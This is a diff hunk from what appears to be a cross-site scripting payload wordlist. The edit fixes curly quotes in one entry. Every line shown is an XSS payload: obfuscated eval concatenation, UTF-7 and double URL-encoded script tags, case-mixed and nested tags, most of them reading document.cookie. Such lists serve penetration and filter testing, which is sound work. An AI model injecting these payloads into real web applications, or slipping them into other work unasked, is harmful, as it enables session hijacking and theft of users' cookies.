@@ -279,7 +279,7 @@ a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
 +ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
 %2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
 %253cscript%253ealert(document.cookie)%253c/script%253e
-"><s”%2b”cript>alert(document.cookie)</script>
+"><s"%2b"cript>alert(document.cookie)</script>
 "><ScRiPt>alert(document.cookie)</script>
 "><<script>alert(document.cookie);//<</script>
 foo<script>alert(document.cookie)</script>
